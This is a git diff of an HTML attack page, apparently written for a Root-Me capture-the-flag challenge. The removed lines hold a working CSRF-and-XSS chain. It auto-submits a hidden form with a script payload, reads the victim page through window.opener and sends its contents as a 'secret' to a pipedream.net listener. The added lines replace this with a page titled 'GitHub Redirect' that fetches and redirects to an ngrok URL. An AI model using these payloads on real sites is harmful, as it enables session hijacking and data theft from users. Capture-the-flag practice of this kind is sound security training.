@@ -1,75 +1,38 @@
 <!DOCTYPE html>
+
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
-    <title>Congratulations! Claim Your Prize Now.</title>
-    <style>
-        body { font-family: 'Inter', sans-serif; text-align: center; padding-top: 50px; background-color: #1f2937; color: #f9fafb; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
-        .card { background-color: #374151; padding: 2.5rem; border-radius: 0.75rem; box-shadow: 0 10px 15px rgba(0, 0, 0, 0.5); max-width: 400px; width: 90%; }
-        h1 { font-size: 1.5rem; margin-bottom: 0.5rem; color: #a5b4fc; }
-        p { margin-bottom: 1.5rem; font-size: 0.9rem; }
-        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-top: 4px solid #818cf8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 1.5rem auto 0; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-    <script src="https://cdn.tailwindcss.com"></script>
-</head>
-<body>
-    <div class="card">
-        <h1>Initiating Session Validation...</h1>
-        <p>Please wait a few seconds. Do not close this window.</p>
-        <div class="spinner"></div>
-
-        <!-- --- ÉTAPE 1 : FORMULAIRE CSRF (Masqué et soumis automatiquement) --- -->
-        <form id="csrfForm" method="POST" action="http://challenge01.root-me.org:58003/login" style="display: none;">
-            <input type="hidden" name="username" id="username">
-        </form>
-    </div>
-
+    <title>GitHub Redirect</title>
     <script>
-        const CHALLENGE_DOMAIN = "http://challenge01.root-me.org:58003";
-        const VULNERABLE_PAGE = "/profile";
-        
-        // --- FIX DE LA CHAÎNE XSS ---
-        // Ajout des échappements nécessaires (">< et <!--) pour sortir de l'attribut 'value' HTML.
-        const MALICIOUS_PAYLOAD = "<script>" +
-            "setTimeout(function() {" +                   
-                    // 2. Encode le secret pour l'URL
-                    "var encodedSecret = window.opener.document.body.innerHTML;" +
-                    "window['location']['href']= `https://eotoci65n24zl7e.m.pipedream.net/?secret=${encodeURIComponent(encodedSecret)}`;" +
-                    
-                    "console.log('Secret exfiltrated! Check your listener logs.');" +
-            "}, 1000);</script>";
-        
-        // --- Exécution de l'attaque ---
+        const url = "https://9bb8bf9a5d86.ngrok-free.app";
 
-        // PHASE 1 : CSRF (Amorçage de session)
-        function executeCsrf() {
-            // Définit la valeur malveillante dans le champ de formulaire masqué
-            document.getElementById('username').value = MALICIOUS_PAYLOAD;
 
-            // Soumet automatiquement le formulaire au domaine cible, en envoyant les cookies de l'Admin.
-            fetch('https://eotoci65n24zl7e.m.pipedream.net/?status=csrf_executed');
+        // Need to perform redirection with custom header, so we use fetch to trigger preflight
+        // gotta add cors cause: Le corps de la réponse n’est pas disponible aux scripts (raison : CORS Missing Allow Origin)
+        // Gotta add ngrok-skip-browser-warning to bypass ngrok browser warning
+        fetch(url, {
+            method: 'GET',
+            headers: {
+                'ngrok-skip-browser-warning': 'true',
+                'X-Custom-Header': 'MyValue'
+            },
+            mode: 'cors'
+        }).then(response => {
+            // After preflight, navigate to the URL
+            window.location.href = url;
+        }).catch(error => {
+            console.error('Error during fetch:', error);
+            // Fallback navigation in case of error
+            window.location.href = url;
+        });
 
-            setTimeout(function() {
-              document.getElementById('csrfForm').submit();
-              console.log("Phase 1: CSRF POST submitted. Payload stored in Admin's session.");        
-            }, 1000);
-        }
-
-        function executeOpenerDelivery() {
-            // 1. Ouvre un nouvel onglet vers le domaine cible pour établir la relation 'opener'.
-            const targetWindow = window.open(window.location.href, 'MyCustomWindowName');
-        }
-
-        // --- Enchaînement des étapes d'attaque ---
-        if(window.name != "MyCustomWindowName") {
-          executeOpenerDelivery();
-          window.location = CHALLENGE_DOMAIN + VULNERABLE_PAGE
-        }
-
-        executeCsrf()
-        
-        
     </script>
+</head>
+
+<body>
+    <h1>Redirecting to GitHub...</h1>
 </body>
+
 </html>
